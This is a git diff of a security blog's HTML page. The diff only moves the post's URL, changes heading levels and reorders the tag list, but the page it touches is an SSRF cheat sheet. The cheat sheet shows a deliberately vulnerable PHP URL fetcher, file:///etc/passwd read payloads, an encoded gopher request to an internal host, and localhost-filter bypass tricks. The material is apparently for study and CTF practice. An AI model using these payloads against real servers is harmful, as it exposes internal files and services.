@@ -131,7 +131,7 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/2024/01/29/SSRF/SSRF/" >SSRF</a>
+			<a href="/2024/01/29/Other/SSRF/" >SSRF</a>
 		</h3>
 		</div>
 	<div class="col-md-4">
@@ -145,7 +145,7 @@
   <div class="row">
 	
 	
-		<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@main/main/image-1727233862238.png" alt="img"></p>
+		<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@main/main/image-1727233862238.png" alt="img"></p>
 <p>example</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;  </span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>);</span><br></pre></td></tr></table></figure>
 
@@ -154,7 +154,7 @@
 <p>payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1/ssrf.php?passwd=adminTrue</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
-<h3 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">file://</span><br><span class="line">dict://</span><br><span class="line">gopher://</span><br><span class="line">ftp://</span><br><span class="line">sftp://</span><br><span class="line">ldap://</span><br><span class="line">tftp://</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<h2 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">file://</span><br><span class="line">dict://</span><br><span class="line">gopher://</span><br><span class="line">ftp://</span><br><span class="line">sftp://</span><br><span class="line">ldap://</span><br><span class="line">tftp://</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
 <p>file:&#x2F;&#x2F;</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file://</span><br><span class="line">file:///etc/passwd</span><br><span class="line">file:///etc/hosts</span><br><span class="line">file:///proc/net/arp</span><br><span class="line">file:///proc/net/fib_trie</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
@@ -168,7 +168,7 @@
 <p>gopher:&#x2F;&#x2F;</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 默认端口 70</span><br><span class="line">gopher://ip:port/_gopher-text	# _ 是填充位（可为任意字符），不会被接收</span><br><span class="line"></span><br><span class="line"># gopher是第一台服务器解析，_ 后的数据是第二台服务器解析，所以需要双重url编码</span><br><span class="line">gopher%3A%2F%2F172.250.250.4%3A80%2F_%2550%254f%2553%2554%2520%252f%256e%2561%256d%2565%252e%2570%2568%2570%253f%256e%2561%256d%2565%253d%2571%2571%2571%2520%2548%2554%2554%2550%252f%2531%252e%2531%250d%250a%2548%256f%2573%2574%253a%2520%2531%2537%2532%252e%2532%2535%2530%252e%2532%2535%2530%252e%2534%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%2554%2579%2570%2565%253a%2520%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%2578%252d%2577%2577%2577%252d%2566%256f%2572%256d%252d%2575%2572%256c%2565%256e%2563%256f%2564%2565%2564%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%254c%2565%256e%2567%2574%2568%253a%2520%2531%2530%250d%250a%250d%250a%256e%2561%256d%2565%253d%256e%2532%2572%2579%2578</span><br><span class="line"></span><br><span class="line"># _ 后的数据双重url解码</span><br><span class="line"></span><br><span class="line">POST /name.php?name=qqq HTTP/1.1</span><br><span class="line">Host: 172.250.250.4</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">name=n2ryx</span><br></pre></td></tr></table></figure>
 
-<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>进制转换</p>
+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>进制转换</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># localhost 127.0.0.1</span><br><span class="line">http://0x7F.0.0.1	//16进制</span><br><span class="line">http://0177.0.0.1	//8进制</span><br><span class="line">http://2130706433	//10进制整数格式</span><br><span class="line">http://0x7F000001	16进制整数格式</span><br><span class="line">http://127.1	//省略模式</span><br><span class="line">http://127.127.127.127	//用CIDR绕过localhost</span><br><span class="line">http://0	//特殊地址0</span><br><span class="line">http://0.0.0.0</span><br><span class="line">http://[::1]	//ipv6回环地址</span><br></pre></td></tr></table></figure>
 
 <p>302重定向</p>
@@ -180,7 +180,7 @@
 <p><code> # @</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.baidu.com@www.qq.com  // 实则访问www.qq.com</span><br><span class="line">http://www.baidu.com#www.qq.com  // 实则访问www.baidu.com</span><br></pre></td></tr></table></figure>
 
-<h3 id="gopherus"><a href="#gopherus" class="headerlink" title="gopherus"></a>gopherus</h3><p>Usage</p>
+<h2 id="gopherus"><a href="#gopherus" class="headerlink" title="gopherus"></a>gopherus</h2><p>Usage</p>
 <table>
 <thead>
 <tr>
@@ -241,7 +241,7 @@
 
 	
 	</div>
-  <a type="button" href="/2024/01/29/SSRF/SSRF/#more" class="btn btn-default more">Read More</a>
+  <a type="button" href="/2024/01/29/Other/SSRF/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -415,15 +415,13 @@
 		
 			<li><a href="/categories/Mysql/">Mysql<span>2</span></a></li>
 		
-			<li><a href="/categories/Network/">Network<span>1</span></a></li>
+			<li><a href="/categories/Other/">Other<span>1</span></a></li>
 		
 			<li><a href="/categories/Pentest/">Pentest<span>10</span></a></li>
 		
-			<li><a href="/categories/Php/">Php<span>4</span></a></li>
+			<li><a href="/categories/Php/">Php<span>5</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>1</span></a></li>
-		
-			<li><a href="/categories/SSRF/">SSRF<span>1</span></a></li>
 		
 			<li><a href="/categories/Tool/">Tool<span>1</span></a></li>
 		
@@ -440,48 +438,44 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/Shiro/">Shiro<span>1</span></a></li>
+			<li><a href="/tags/JNDI/">JNDI<span>1</span></a></li>
 		
-			<li><a href="/tags/HTB/">HTB<span>10</span></a></li>
+			<li><a href="/tags/Dict/">Dict<span>2</span></a></li>
+		
+			<li><a href="/tags/Tunnel/">Tunnel<span>1</span></a></li>
+		
+			<li><a href="/tags/Fastjson/">Fastjson<span>1</span></a></li>
+		
+			<li><a href="/tags/Inject/">Inject<span>1</span></a></li>
+		
+			<li><a href="/tags/Protocol/">Protocol<span>2</span></a></li>
+		
+			<li><a href="/tags/Log4j2/">Log4j2<span>1</span></a></li>
+		
+			<li><a href="/tags/CTFshow/">CTFshow<span>1</span></a></li>
+		
+			<li><a href="/tags/BUUCTF/">BUUCTF<span>1</span></a></li>
 		
 			<li><a href="/tags/Pollution/">Pollution<span>2</span></a></li>
 		
 			<li><a href="/tags/Priesc/">Priesc<span>2</span></a></li>
 		
-			<li><a href="/tags/Protocol/">Protocol<span>1</span></a></li>
+			<li><a href="/tags/Base/">Base<span>5</span></a></li>
 		
-			<li><a href="/tags/Network/">Network<span>1</span></a></li>
-		
-			<li><a href="/tags/Deserialize/">Deserialize<span>7</span></a></li>
-		
-			<li><a href="/tags/JNDI/">JNDI<span>1</span></a></li>
+			<li><a href="/tags/HTB/">HTB<span>10</span></a></li>
 		
 			<li><a href="/tags/RMI/">RMI<span>1</span></a></li>
 		
-			<li><a href="/tags/Upload/">Upload<span>1</span></a></li>
+			<li><a href="/tags/Deserialize/">Deserialize<span>7</span></a></li>
 		
-			<li><a href="/tags/CTFshow/">CTFshow<span>1</span></a></li>
-		
-			<li><a href="/tags/Hash/">Hash<span>1</span></a></li>
-		
-			<li><a href="/tags/Log4j2/">Log4j2<span>1</span></a></li>
-		
-			<li><a href="/tags/BUUCTF/">BUUCTF<span>1</span></a></li>
-		
-			<li><a href="/tags/Fastjson/">Fastjson<span>1</span></a></li>
-		
-			<li><a href="/tags/Base/">Base<span>5</span></a></li>
-		
-			<li><a href="/tags/Http/">Http<span>1</span></a></li>
-		
-			<li><a href="/tags/Tunnel/">Tunnel<span>1</span></a></li>
+			<li><a href="/tags/CommonsCollections/">CommonsCollections<span>5</span></a></li>
 		
 			<li><a href="/tags/CISCN/">CISCN<span>3</span></a></li>
 		
-			<li><a href="/tags/Inject/">Inject<span>1</span></a></li>
+			<li><a href="/tags/Hash/">Hash<span>1</span></a></li>
 		
+			<li><a href="/tags/Shiro/">Shiro<span>1</span></a></li>
 		
-		   <li><a href="/tags">...<span>21</span></a></li>
 		 
 		</ul>
 	</div>
